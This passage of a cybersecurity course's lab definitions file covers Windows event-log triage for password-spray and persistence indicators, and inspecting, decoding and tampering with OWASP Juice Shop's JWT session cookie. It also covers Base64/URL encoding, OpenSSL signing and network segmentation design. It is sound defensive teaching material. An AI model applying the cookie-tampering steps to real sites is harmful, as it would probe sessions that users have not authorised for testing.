        path: "/lab-assets/L11/password-spray.evtx",
        description:
          "Real Security log showing a password-spray: many 4625 failures across accounts, then a 4624 success. Start here.",
        size: "1.1 MB",
      },
      {
        name: "new-user-security.evtx",
        path: "/lab-assets/L11/new-user-security.evtx",
        description:
          "Account/privilege persistence: a 4720 user creation followed by 4732 group additions.",
        size: "68 KB",
      },
      {
        name: "metasploit-psexec-powershell-target-security.evtx",
        path: "/lab-assets/L11/metasploit-psexec-powershell-target-security.evtx",
        description:
          "Lateral-movement sample: a 7045 service install from a psexec-style remote execution.",
        size: "68 KB",
      },
      {
        name: "Powershell-Invoke-Obfuscation-encoding-menu.evtx",
        path: "/lab-assets/L11/Powershell-Invoke-Obfuscation-encoding-menu.evtx",
        description:
          "Obfuscated-PowerShell execution log for spotting encoded-command persistence indicators.",
        size: "1.1 MB",
      },
      {
        name: "psattack-security.evtx",
        path: "/lab-assets/L11/psattack-security.evtx",
        description:
          "PowerShell-attack Security log — a second correlation target once you've worked the first.",
        size: "68 KB",
      },
    ],
    instructions: [
      "Download the sample logs from the Lab Files section above (hosted in-portal — no external download needed). Start with password-spray.evtx",
      "Open Event Viewer -> Action -> Open Saved Log and load the .evtx file",
      "Filter by Event ID 4625 (failed logon) alongside 4624 (successful logon) to spot a password-spray pattern: many failures across many accounts in a short window, followed by one success",
      "Filter by Event ID 4720 (user account created) and 4732 (member added to a security-enabled local group) to catch suspicious account/privilege changes",
      "Filter by Event ID 7045 (new service installed) — a classic Windows persistence mechanism",
      "Filter by Event ID 11707 (product installation successful) and 1033 (installation detail — Product, Version, Language, Manufacturer fields) to spot an unexpected or suspicious software install, exactly as in the real Totally_Legit_Software.msi training incident where the installer's Manufacturer field itself carried a clue",
      "Filter by Event ID 4657 (registry key modification — requires object-access auditing to be enabled) to catch persistence via keys like HKCU\\...\\Run, and cross-reference with Event ID 1074 (shutdown/restart) if the modification appears to trigger a reboot or shutdown loop",
      "Filter by Event ID 4688 (new process created) to review any suspicious process command lines (only populated if command-line auditing is enabled)",
      "Look up each flagged Event ID in the Ultimate Windows Security encyclopedia to confirm you're interpreting the fields correctly",
      "Correlate the timestamps of your 5 findings into a short written timeline explaining what happened, in what order, and why it's suspicious — install, then registry change, then shutdown is the canonical pattern to look for",
    ],
    resources: [
      {
        title: "SANS DeepBlueCLI (sample evtx files included)",
        url: "https://github.com/sans-blue-team/DeepBlueCLI",
        type: "tool",
      },
      {
        title: "EVTX-ATTACK-SAMPLES (sbousseaden)",
        url: "https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES",
        type: "tool",
      },
      {
        title:
          "Windows Security Log Encyclopedia (ultimatewindowssecurity.com)",
        url: "https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/",
        type: "link",
      },
      {
        title: "Get-WinEvent documentation (Microsoft Learn)",
        url: "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent",
        type: "link",
      },
    ],
    completionIndicator: `Event Viewer screenshot with the 5 flagged suspicious Event IDs (e.g. 4625, 4720, 4732, 7045, 4688) visible together in the filtered results pane`,
    slides: [
      {
        title: "Load the sample event log",
        body: "Download a real attack-sample .evtx file (e.g. password-spray.evtx from SANS DeepBlueCLI, or the instructor-provided Windows_logs.evtx) and open it via Event Viewer -> Action -> Open Saved Log.",
      },
      {
        title: "Spot the password spray",
        body: "Filter by Event ID 4625 (failed logon) alongside 4624 (successful logon): many failures across many accounts in a short window followed by one success is the classic password-spray signature.",
        diagram: {
          type: "terminal",
          prompt: "PS C:\\>",
          lines: [
            {
              command:
                "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625,4624}",
            },
          ],
        },
      },
      {
        title: "Check account and privilege changes",
        body: "Filter by Event ID 4720 (user account created) and 4732 (member added to a security-enabled local group) to catch account or privilege changes made after a foothold.",
        diagram: {
          type: "terminal",
          prompt: "PS C:\\>",
          lines: [
            {
              command:
                "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720,4732}",
            },
          ],
        },
      },
      {
        title: "Look for persistence: services and processes",
        body: "Filter Event ID 7045 (new service installed), a classic persistence mechanism, and Event ID 4688 (new process created) to review suspicious process command lines where command-line auditing is enabled.",
        diagram: {
          type: "terminal",
          prompt: "PS C:\\>",
          lines: [
            {
              command:
                "Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045}",
            },
            {
              command:
                "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688}",
            },
          ],
        },
      },
      {
        title: "The installer-to-shutdown chain",
        body: "Filtering roughly 8000 entries down to Event ID 11707/1033 (installation successful / detail) can reveal a suspicious installer — the Manufacturer field itself was the tell in one real Totally_Legit_Software.msi walkthrough. Cross-reference Event ID 4657 (registry key modification) for a rewritten HKCU Run key, then Event ID 1074 (shutdown) to confirm the payoff.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "11707 / 1033",
              detail: "installer runs",
            },
            {
              label: "4657",
              detail: "HKCU\\...\\Run key rewritten",
            },
            {
              label: "1074",
              detail: "system shutdown on login",
            },
          ],
        },
      },
      {
        title: "Correlate into an incident timeline",
        body: "Look up each flagged Event ID in the Ultimate Windows Security encyclopedia to confirm the fields, then correlate all timestamps into a short written timeline — install, then registry change, then shutdown is the canonical pattern to look for.",
      },
      {
        title: "What you just proved",
        body: "You reconstructed an attack from raw noise the same way a SOC analyst does on shift one: not by running a magic tool, but by knowing which Event IDs matter and correlating their timestamps into a story. The install-then-registry-change-then-shutdown pattern you traced is a real persistence chain, and naming each ID before trusting your conclusion is what makes an incident timeline defensible in a report.",
      },
    ],
    hints: [
      "Not sure which Event ID to look at next? Go back through the instructions list — each Event ID there is tied to one specific category: logon attempts, account/privilege changes, persistence, or installs.",
      "If you're trying to find the suspicious chain, focus on the three Event IDs the lab calls out together: 11707/1033 (installer), 4657 (registry key change), and 1074 (shutdown) — those are meant to be read as one sequence.",
      "The canonical order to correlate by timestamp is: an install event first, then a registry key modification under HKCU\\...\\Run, then the resulting shutdown/restart — line those three up first, then slot your other flagged Event IDs around them.",
    ],
  },
  {
    id: "L12",
    number: 12,
    week: 5,
    moduleId: "m4",
    title: "Inspect & manipulate session cookies with DevTools",
    description:
      "Session hijacking, fixation, and CSRF attacks all start from the same gap: a session token that isn't actually locked down the way its flags claim. Using OWASP Juice Shop's real login flow, you inspect its token cookie in DevTools, check whether HttpOnly, Secure, and SameSite are actually set, and confirm the result directly by running document.cookie in the console — Juice Shop's Angular frontend needs to read the JWT client-side, so this is a realistic case of a session token that is only partially protected. Decoding the JWT with CyberChef exposes the claims inside (email, isAdmin), and tampering the cookie value by hand shows you exactly how the server reacts to a broken token. You leave able to read and reason about real session-management flags — the prerequisite for every session-hijacking, fixation, and CSRF test later in the program.",
    objective:
      "Inspect OWASP Juice Shop's token cookie in DevTools, record its HttpOnly/Secure/SameSite flags, decode the JWT claims, and tamper the value to observe the server's reaction.",
    successCriteria: [
      "DevTools screenshot shows the token cookie's HttpOnly/Secure/SameSite flags",
      "document.cookie run in the Console to confirm whether the token is JavaScript-readable",
      "JWT decoded (CyberChef/jwt.io) exposing claims such as email and isAdmin",
      "Short write-up notes which flags were missing, why it matters for XSS/CSRF, and a dev-team recommendation",
    ],
    platform: "Browser DevTools",
    difficulty: "easy",
    estimatedHours: 1,
    instructions: [
      `Run OWASP Juice Shop locally: docker run --rm -p 3000:3000 bkimminich/juice-shop, then browse to http://localhost:3000`,
      `Register an account and log in, then open DevTools (F12) before touching anything else`,
      `Go to Application (Chrome/Edge) or Storage (Firefox) -> Cookies -> http://localhost:3000 and find the cookie named 'token'`,
      `Record whether HttpOnly, Secure, and SameSite are set on it — note that Juice Shop's Angular frontend also needs to read the JWT client-side, so this cookie is a realistic case of a session token that is NOT fully locked down`,
      `In the DevTools Console, run document.cookie and check whether the token value is visible — this tells you whether HttpOnly is actually protecting it`,
      `Copy the JWT value and decode it with CyberChef's 'JWT Decode' operation (or jwt.io) to see the claims stored inside (email, isAdmin, etc.)`,
      `In Application -> Cookies, edit the cookie's value directly (change one character), reload the page, and observe how the app responds (logged out, error, or silently ignored)`,
      `Write 3-5 sentences: which flags were missing, why that matters for XSS/CSRF, and what you'd recommend a dev team change`,
    ],
    resources: [
      {
        title: "OWASP Juice Shop (GitHub)",
        url: "https://github.com/juice-shop/juice-shop",
        type: "tool",
      },
      {
        title: "bkimminich/juice-shop (Docker Hub)",
        url: "https://hub.docker.com/r/bkimminich/juice-shop",
        type: "tool",
      },
      {
        title: "MDN: Document.cookie",
        url: "https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie",
        type: "link",
      },
      {
        title: "MDN: Using HTTP cookies",
        url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies",
        type: "link",
      },
      {
        title: "OWASP Session Management Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
        type: "link",
      },
    ],
    completionIndicator: `browser screenshot showing DevTools Application/Storage panel with the Juice Shop token cookie's HttpOnly/Secure/SameSite flags visible, plus a Console screenshot of the document.cookie result and a short note on the effect of editing the cookie value`,
    dockerImage: "bkimminich/juice-shop",
    containerPort: 3000,
    slides: [
      {
        title: "Stand up Juice Shop locally",
        body: "Run OWASP Juice Shop in Docker (docker run --rm -p 3000:3000 bkimminich/juice-shop) and browse to http://localhost:3000. Register an account and log in before touching DevTools.",
        diagram: {
          type: "container-arch",
          hostLabel: "Your machine (localhost:3000)",
          containerLabel: "Juice Shop container",
          image: "bkimminich/juice-shop",
          hostPort: 3000,
          containerPort: 3000,
        },
      },
      {
        title: "Open DevTools and find the session cookie",
        body: "Open DevTools (F12), go to Application (Chrome/Edge) or Storage (Firefox) -> Cookies -> http://localhost:3000, and find the cookie named 'token'. Record whether HttpOnly, Secure, and SameSite are set on it.",
        diagram: {
          type: "browser-mockup",
          url: "http://localhost:3000",
          annotations: [
            {
              label: "Application > Cookies > token",
              note: "Check HttpOnly / Secure / SameSite flags",
            },
            {
              label: "Angular frontend",
              note: "Also reads this JWT client-side, so it isn't fully locked down",
            },
          ],
        },
      },
      {
        title: "Test HttpOnly from the Console",
        body: "Run document.cookie in the DevTools Console to check whether the token value is actually visible to JavaScript — this tells you whether HttpOnly is really protecting it.",
        diagram: {
          type: "terminal",
          prompt: ">",
          lines: [
            {
              command: "document.cookie",
            },
            {
              output:
                '"language=en; welcomebanner_status=dismiss" (token absent if HttpOnly is set)',
            },
          ],
        },
      },
      {
        title: "Decode the JWT claims",
        body: "Copy the token's JWT value and decode it with CyberChef's 'JWT Decode' operation (or jwt.io) to see the claims stored inside, such as email and isAdmin.",
        diagram: {
          type: "browser-mockup",
          url: "https://gchq.github.io/CyberChef/",
          annotations: [
            {
              label: "JWT Decode operation",
              note: "Reveals email, isAdmin, and other claims inside the token",
            },
          ],
        },
      },
      {
        title: "Tamper the cookie value",
        body: "In Application -> Cookies, edit the token cookie's value directly (change one character), reload the page, and observe how the app responds — logged out, an error, or silently ignored.",
        diagram: {
          type: "browser-mockup",
          url: "http://localhost:3000",
          annotations: [
            {
              label: "Edit cookie value",
              note: "Change one character in 'token', then reload",
            },
            {
              label: "Observe response",
              note: "Logged out / error / silently ignored",
            },
          ],
        },
      },
      {
        title: "Write up the flags that were missing",
        body: "Write 3-5 sentences on which flags were missing, why that matters for XSS/CSRF, and what you'd recommend a dev team change.",
      },
      {
        title: "What you just proved",
        body: "You did the read-before-you-attack step every session-hijacking, fixation, or CSRF test depends on: confirming which flags are actually protecting a token instead of trusting what a header claims. Finding that Juice Shop's frontend needs client-side JWT access — and so can't fully lock the cookie down with HttpOnly — is the same tradeoff you'll spot in real applications that balance usability against session security.",
      },
    ],
    hints: [
      "Can't find the right cookie? It's specifically named 'token', located under Application (or Storage) -> Cookies -> http://localhost:3000.",
      "To test whether HttpOnly is really protecting the cookie, run document.cookie in the DevTools console and see whether the token value actually shows up there.",
      "Remember the detail already noted for you: Juice Shop's Angular frontend needs to read the JWT client-side, so don't expect this particular cookie's flags to be fully locked down the way a textbook example would be.",
    ],
  },
  {
    id: "L13",
    number: 13,
    week: 5,
    moduleId: "m5",
    title: "Manually encode/decode strings in Base64 & URL encoding",
    description:
      'A Base64 blob in an HTTP header or a percent-encoded query string in a Burp request is reversible in seconds once you know the alphabet, not a cryptographic wall. This lab has you hand-derive the Base64 encoding of five strings (6-bit chunks, the A-Za-z0-9+/ alphabet, = padding) and the percent-encoding of special characters, then cross-check every result against the terminal and CyberChef\'s Recipe pane. Chaining URL Encode into URL Decode proves the round-trip is lossless, and saving the recipe as a shareable link is a reminder that both the recipe and your input data are embedded directly in that URL. You leave able to decode Base64 and percent-encoded data on sight without reaching for a tool, and able to explain why "it\'s encoded" is not the same claim as "it\'s encrypted."',
    objective:
      "Hand-derive the Base64 and percent-encoding of five strings, then cross-check every result against the terminal and CyberChef and prove the URL encode/decode round-trip is lossless.",
    successCriteria: [
      "All 5 strings' manual/terminal Base64 and URL-encoding results match CyberChef's output pane exactly",
      "A chained URL Encode -> URL Decode recipe confirms the original string is recovered",
      "One CyberChef recipe saved as a shareable URL, noting recipe and input are embedded in it",
      "One sentence per string names a real scenario for reversing that encoding",
    ],
    platform: "CyberChef",
    difficulty: "easy",
    estimatedHours: 1,
    instructions: [
      `Pick 5 short strings of varying length, including at least one with spaces and one with & or = characters`,
      `For each string, manually work out the Base64 encoding on paper/whiteboard: group into 6-bit chunks and map to the A-Za-z0-9+/ alphabet, padding with = as needed`,
      `Verify each with the terminal: echo -n 'string' | base64`,
      `Open CyberChef at https://gchq.github.io/CyberChef/, drag the 'To Base64' operation into the Recipe pane, paste each string into Input, and confirm the Output matches your manual/terminal result`,
      `Do the same for percent/URL encoding: manually convert each special character to %XX (its hex ASCII value), noting that a space becomes %20 (or + in form-encoded contexts)`,
      `Verify with CyberChef's 'URL Encode' operation, then chain 'URL Decode' immediately after it in the same recipe to confirm you get the original string back`,
      `Save one CyberChef recipe as a shareable URL (Recipe pane -> the link icon) and note how the recipe and input are embedded directly in the URL`,
      `Write one sentence per string explaining a real scenario where you'd need to reverse this encoding (e.g. a URL-encoded query string in a Burp request, a Base64 blob in an HTTP header)`,
    ],
    resources: [
      {
        title: "CyberChef",
        url: "https://gchq.github.io/CyberChef/",
        type: "tool",
      },
      {
        title: "CyberChef source (GitHub)",
        url: "https://github.com/gchq/CyberChef",
        type: "link",
      },
      {
        title: "MDN: Percent-encoding glossary",
        url: "https://developer.mozilla.org/en-US/docs/Glossary/Percent-encoding",
        type: "link",
      },
      {
        title: "RFC 4648: The Base16, Base32, and Base64 Data Encodings",
        url: "https://www.rfc-editor.org/rfc/rfc4648",
        type: "link",
      },
    ],
    completionIndicator: `screenshot showing all 5 strings' manual/terminal Base64 and URL-encoding results matching CyberChef's Recipe output pane exactly, with the decode step confirming round-trip correctness`,
    slides: [
      {
        title: "Pick 5 strings to test",
        body: "Pick 5 short strings of varying length, including at least one with spaces and one with & or = characters — these get encoded and decoded by hand, then checked against CyberChef.",
      },
      {
        title: "Manually work out Base64, verify in the terminal",
        body: "Work out each string's Base64 encoding by hand — group into 6-bit chunks, map to the A-Za-z0-9+/ alphabet, pad with = — then verify with echo -n 'string' | base64.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "echo -n 'hello world' | base64",
            },
            {
              output: "aGVsbG8gd29ybGQ=",
            },
          ],
        },
      },
      {
        title: "Confirm in CyberChef's Recipe pane",
        body: "Open CyberChef at gchq.github.io/CyberChef, drag 'To Base64' into the Recipe pane, paste each string into Input, and confirm the Output matches your manual/terminal result.",
        diagram: {
          type: "browser-mockup",
          url: "https://gchq.github.io/CyberChef/",
          annotations: [
            {
              label: "Recipe: To Base64",
              note: "Output pane should match your manual + terminal result",
            },
          ],
        },
      },
      {
        title: "URL-encode, then decode back",
        body: "Manually convert each special character to %XX using its hex ASCII value (space becomes %20), then chain CyberChef's 'URL Encode' followed immediately by 'URL Decode' in the same recipe to confirm you get the original string back.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Original string",
              detail: "e.g. a=1&b=2",
            },
            {
              label: "URL Encode",
              detail: "a%3D1%26b%3D2",
            },
            {
              label: "URL Decode",
              detail: "round-trip check",
            },
            {
              label: "Matches original?",
              detail: "confirms encoding is reversible, not secret",
            },
          ],
        },
      },
      {
        title: "Save the recipe as a shareable URL",
        body: "Save one CyberChef recipe as a shareable URL via the Recipe pane's link icon, and note how both the recipe and the input string are embedded directly in the generated URL.",
        diagram: {
          type: "browser-mockup",
          url: "https://gchq.github.io/CyberChef/",
          annotations: [
            {
              label: "Recipe pane link icon",
              note: "Recipe + input are embedded directly in the generated URL",
            },
          ],
        },
      },
      {
        title: "Tie it to a real scenario",
        body: "Write one sentence per string explaining a real scenario where you'd need to reverse this encoding — e.g. a URL-encoded query string in a Burp request, or a Base64 blob inside an HTTP header.",
      },
      {
        title: "Why this matters",
        body: "Encoding schemes like Base64 and percent-encoding show up everywhere in real traffic — HTTP headers, Burp requests, malware config blobs — and treating them as unbreakable ciphers instead of simple, reversible transforms is a common analyst mistake. Being able to decode them on sight, and to prove the round-trip with your own hands instead of trusting a tool blindly, is exactly what separates reading a capture correctly from missing what's hiding in plain sight.",
      },
    ],
    hints: [
      "Stuck on the manual Base64 step? Start by breaking the string into 6-bit chunks before you try to map anything to letters.",
      "Each 6-bit chunk maps to a character in the A-Za-z0-9+/ alphabet, and if the chunks don't divide evenly you pad the output with = characters.",
      "For the URL-encoding half, each special character becomes %XX using its hex ASCII value — and specifically, a space becomes %20.",
    ],
  },
  {
    id: "L14",
    number: 14,
    week: 5,
    moduleId: "m5",
    title: "Generate RSA keypair with OpenSSL, sign & verify a file",
    description:
      "Every code-signing certificate, TLS handshake, and SSH key-based login rests on the same asymmetric trick you'll perform by hand here: a private key produces a signature that anyone holding only the matching public key can verify — never the reverse. You'll generate a real 2048-bit RSA keypair with OpenSSL, sign a test file's SHA-256 hash with the private key, and confirm 'Verified OK' using nothing but public.pem. Then you break it on purpose — append a byte to the file and re-run the identical verify command to watch 'Verification Failure' appear, proving the signature is bound to the exact original bytes, not just the file's existence. You come away able to generate, sign, and verify with OpenSSL from memory, and with a concrete mental model of what \"verified\" actually guarantees the next time a package manager or TLS handshake reports it.",
    objective:
      "Generate a 2048-bit RSA keypair with OpenSSL, sign a file's SHA-256 hash with the private key, verify it with only the public key, then tamper the file and watch verification fail.",
    successCriteria: [
      "Terminal shows 'Verified OK' on the untouched file using public.pem, file.sig, and file.txt",
      "'Verification Failure' shown after the file is modified, with both sign and verify commands in scrollback",
      "One sentence explains why verifying against a different/regenerated public key also fails",
    ],
    platform: "OpenSSL / Terminal",
    difficulty: "medium",
    estimatedHours: 2,
    instructions: [
      `Generate a 2048-bit RSA private key: openssl genrsa -out private.pem 2048 (or the modern equivalent: openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out private.pem)`,
      `Derive the public key from it: openssl rsa -in private.pem -pubout -out public.pem`,
      `Inspect the key's modulus and exponent: openssl rsa -in private.pem -text -noout | head -20`,
      `Create a test file (echo 'integrity test' > file.txt) and sign its SHA-256 hash: openssl dgst -sha256 -sign private.pem -out file.sig file.txt`,
      `Inspect the signature bytes: xxd file.sig | head, noting it's a fixed-size binary blob regardless of the input file's length`,
      `Verify the signature using only the public key: openssl dgst -sha256 -verify public.pem -signature file.sig file.txt (expect 'Verified OK')`,
      `Modify file.txt slightly (echo 'tampered' >> file.txt) and re-run the verify command — confirm it now prints 'Verification Failure'`,
      `Try verifying file.sig against a *different* file's public key or a re-generated keypair's public key, and explain in one sentence why that also fails`,
    ],
    resources: [
      {
        title: "OpenSSL documentation",
        url: "https://www.openssl.org/docs/",
        type: "link",
      },
      {
        title: "openssl-genpkey manual",
        url: "https://docs.openssl.org/3.1/man1/openssl-genpkey/",
        type: "link",
      },
      {
        title: "openssl-dgst manual",
        url: "https://docs.openssl.org/3.1/man1/openssl-dgst/",
        type: "link",
      },
      {
        title: "OpenSSL Cookbook: Key Generation (Feisty Duck)",
        url: "https://www.feistyduck.com/library/openssl-cookbook/online/openssl-command-line/key-generation.html",
        type: "link",
      },
    ],
    completionIndicator: `terminal output showing 'Verified OK' on the untouched file, followed by 'Verification Failure' after the file was modified, with both the sign and verify commands visible in scrollback`,
    slides: [
      {
        title: "Two keys, two jobs",
        body: "RSA sign/verify uses the private key to produce a signature and only the public key to check it — the same asymmetric split behind code-signing, TLS certificates, and SSH key auth.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "private.pem",
              detail: "signs the file's SHA-256 hash",
            },
            {
              label: "file.sig",
              detail: "fixed-size binary signature",
            },
            {
              label: "public.pem",
              detail: "verifies the signature — never signs",
            },
            {
              label: "Verified OK",
              detail: "only if the private key produced this exact signature",
            },
          ],
        },
      },
      {
        title: "Generate the keypair",
        body: "Generate a 2048-bit RSA private key with openssl genrsa, then derive the public key from it with openssl rsa -pubout.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "openssl genrsa -out private.pem 2048",
            },
            {
              command: "openssl rsa -in private.pem -pubout -out public.pem",
            },
            {
              output: "writing RSA key",
            },
          ],
        },
      },
      {
        title: "Sign the file's hash",
        body: "Create a test file, then sign its SHA-256 hash with the private key: openssl dgst -sha256 -sign private.pem -out file.sig file.txt. Inspecting file.sig with xxd shows a fixed-size binary blob regardless of the input file's length.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "echo 'integrity test' > file.txt",
            },
            {
              command:
                "openssl dgst -sha256 -sign private.pem -out file.sig file.txt",
            },
            {
              command: "xxd file.sig | head",
            },
          ],
        },
      },
      {
        title: "Verify with only the public key",
        body: "Verify the signature using nothing but the public key: openssl dgst -sha256 -verify public.pem -signature file.sig file.txt should print 'Verified OK'.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command:
                "openssl dgst -sha256 -verify public.pem -signature file.sig file.txt",
            },
            {
              output: "Verified OK",
            },
          ],
        },
      },
      {
        title: "Tamper the file and re-verify",
        body: "Modify file.txt (echo 'tampered' >> file.txt) and re-run the same verify command — it now prints 'Verification Failure', proving the signature is bound to the exact original bytes.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "echo 'tampered' >> file.txt",
            },
            {
              command:
                "openssl dgst -sha256 -verify public.pem -signature file.sig file.txt",
            },
            {
              output: "Verification Failure",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "The sign-with-private/verify-with-public pattern you just exercised by hand is the exact mechanism behind TLS certificate validation, OS and package code-signing, and SSH key authentication — systems trainees rely on daily without ever seeing how they actually reject tampering. Having watched 'Verified OK' flip to 'Verification Failure' from a single appended byte, you now know precisely what a signature check does and does not guarantee.",
      },
    ],
    hints: [
      "If the verify step isn't behaving as expected, check that you're using the public key file, the .sig file, and the exact same file.txt you signed — in that order.",
      "Getting 'Verification Failure' when you expect 'Verified OK'? Make sure you're verifying against the untouched file.txt from before the tampering step, not the modified one.",
      "The exact command is: openssl dgst -sha256 -verify public.pem -signature file.sig file.txt — run that against the original file first, and only append text to file.txt afterward as the later step describes.",
    ],
  },
  {
    id: "L15",
    number: 15,
    week: 6,
    moduleId: "m6",
    title: "Design a segmented corporate network diagram in draw.io",
    description:
      "Before a security architect touches a firewall rule or a pentester runs a single Nmap scan, someone has to decide where the DMZ ends and the internal VLANs begin — get that segmentation wrong and a single compromised web server in the DMZ has a clear path to the domain controller. In draw.io, you'll build that decision from scratch: an internet edge behind a perimeter firewall, a DMZ web server, at least three internal VLANs with labelled CIDRs behind a Layer-3 switch, and an Active Directory domain controller wired to the VLANs it authenticates. You'll then annotate the NIST SP 800-207 Zero Trust controls that actually enforce the boundaries — IAM/MFA at the access edge, micro-segmentation between VLANs, IDS/IPS/WAF at the perimeter — and label which traffic flows are permitted between zones and which are denied. The exported diagram and its rationale paragraph are the same kind of artifact you'll hand a client, and the same baseline you'll later use to sanity-check what BloodHound and Nmap reveal about how the network actually behaves.",
    objective:
      "Design a segmented corporate network in draw.io with an internet edge, perimeter firewall, DMZ web server, three CIDR-labelled internal VLANs, an AD domain controller, and annotated Zero Trust controls and traffic-flow rules.",
    successCriteria: [
      "Exported PNG/PDF shows a labelled DMZ, at least 3 VLANs with CIDRs, an AD domain controller, and IDS/IPS/WAF placement",
      "Zero Trust controls (IAM/MFA, micro-segmentation, IDS/IPS/WAF) annotated with permitted/denied flows between zones",
      "A short paragraph explains the traffic-flow rules and why each control sits where it does",
    ],
    platform: "draw.io",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Open https://app.diagrams.net (draw.io) and start a new blank diagram, or use the built-in 'Basic Network' template`,
      `In the left shape panel, click 'More Shapes' -> enable the 'Networking' (and optionally AWS/Azure or Cisco) stencil libraries -> Apply`,
      `Add an internet edge (cloud shape) -> perimeter firewall -> a DMZ segment hosting a public-facing web server`,
      `Add at least 3 internal VLANs (e.g. HR, IT, Finance) connected through a Layer-3 switch/router, with each VLAN's subnet CIDR labelled`,
      `Add an Active Directory domain controller inside the internal network, connected to the VLANs it authenticates`,
      `Annotate Zero Trust controls: IAM/MFA at the access edge, micro-segmentation boundaries between VLANs, and IDS/IPS/WAF placement at the DMZ and perimeter`,
      `Use arrows/labels to show which traffic flows are permitted between zones (e.g. 'DMZ -> Internal: denied except port 443 to app tier')`,
      `Export the diagram as PNG or PDF (File -> Export as) and write a short paragraph explaining the traffic-flow rules and why each control is placed where it is`,
    ],
    resources: [
      {
        title: "draw.io / diagrams.net",
        url: "https://app.diagrams.net",
        type: "tool",
      },
      {
        title: "draw.io: Drawing network and infrastructure diagrams",
        url: "https://www.drawio.com/docs/diagram-types/network-diagrams/",
        type: "link",
      },
      {
        title: "draw.io: Network and technical diagram shapes",
        url: "https://drawio-app.com/blog/network-and-technical-diagram-shapes-in-draw-io/",
        type: "link",
      },
      {
        title: "NIST SP 800-207: Zero Trust Architecture",
        url: "https://csrc.nist.gov/pubs/sp/800/207/final",
        type: "link",
      },
    ],
    completionIndicator: `exported PNG/PDF of the network diagram showing a labelled DMZ, at least 3 labelled VLANs with CIDRs, an Active Directory domain controller, IDS/IPS/WAF placement, and annotated Zero Trust controls with traffic-flow rules between zones`,
    slides: [
      {
        title: "Open draw.io and load the Networking stencils",
        body: "Open app.diagrams.net and start a blank diagram (or the 'Basic Network' template), then click 'More Shapes' and enable the Networking stencil library so real network shapes are available.",
        diagram: {
          type: "browser-mockup",
          url: "https://app.diagrams.net",
          annotations: [
            {
              label: "More Shapes",
              note: "Enable Networking (and optionally AWS/Azure or Cisco) stencils",
            },
          ],
        },
      },
      {
        title: "Build the internet edge, firewall, and DMZ",
        body: "Add an internet cloud shape, a perimeter firewall, and a DMZ segment hosting a public-facing web server — the first traffic-flow boundary in the diagram.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "internet",
              label: "Internet",
              kind: "device",
            },
            {
              id: "fw",
              label: "Perimeter firewall",
              kind: "firewall",
            },
            {
              id: "dmz-web",
              label: "DMZ web server",
              kind: "server",
            },
          ],
          edges: [
            {
              from: "internet",
              to: "fw",
              label: "inbound",
            },
            {
              from: "fw",
              to: "dmz-web",
              label: "permitted: 443 only",
            },
          ],
        },
      },
      {
        title: "Add internal VLANs and the AD domain controller",
        body: "Add at least 3 internal VLANs (HR, IT, Finance) connected through a Layer-3 switch/router, each labelled with its subnet CIDR, plus an Active Directory domain controller connected to the VLANs it authenticates.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "fw",
              label: "Perimeter firewall",
              kind: "firewall",
            },
            {
              id: "switch",
              label: "L3 switch/router",
              kind: "router",
            },
            {
              id: "hr",
              label: "HR VLAN 10.0.10.0/24",
              kind: "device",
            },
            {
              id: "it",
              label: "IT VLAN 10.0.20.0/24",
              kind: "device",
            },
            {
              id: "fin",
              label: "Finance VLAN 10.0.30.0/24",
              kind: "device",
            },
            {
              id: "dc",
              label: "AD Domain Controller",
              kind: "server",
            },
          ],
          edges: [
            {
              from: "fw",
              to: "switch",
            },
            {
              from: "switch",
              to: "hr",
            },
            {
              from: "switch",
              to: "it",
            },
            {
              from: "switch",
              to: "fin",
            },
            {
              from: "switch",
              to: "dc",
              label: "authenticates VLANs",
            },
          ],
        },
      },
      {
        title: "Annotate Zero Trust controls and traffic rules",
        body: "Label IAM/MFA at the access edge, micro-segmentation boundaries between VLANs, and IDS/IPS/WAF placement at the DMZ and perimeter, then use arrows to show which flows are permitted between zones — e.g. 'DMZ -> Internal: denied except port 443 to app tier'.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "dmz-web",
              label: "DMZ web server",
              kind: "server",
            },
            {
              id: "waf",
              label: "WAF / IDS/IPS",
              kind: "firewall",
            },
            {
              id: "internal",
              label: "Internal network",
              kind: "router",
            },
          ],
          edges: [
            {
              from: "dmz-web",
              to: "waf",
            },
            {
              from: "waf",
              to: "internal",
              label: "DMZ -> Internal: denied except 443 to app tier",
              dashed: true,
            },
          ],
        },
      },
      {
        title: "Export and document the rationale",
        body: "Export the diagram as PNG or PDF (File -> Export as), then write a short paragraph explaining the traffic-flow rules and why each control is placed where it is.",
      },
      {
        title: "Why this matters",
        body: "The segmentation decisions you just diagrammed — DMZ boundaries, VLAN isolation, Zero Trust controls at each edge — are the same decisions that determine whether a compromised DMZ web server can reach the domain controller in a real breach. Later in the course, Nmap and BloodHound will show you whether an actual network enforces the boundaries you just designed, or only claims to.",
      },
    ],
    hints: [
      "Missing network shapes in the panel? Click 'More Shapes' in the left panel and enable the Networking stencil library first.",
      "For the internal side, you need at least 3 separate VLANs, each with its own labelled subnet CIDR, all connected through a single Layer-3 switch/router.",
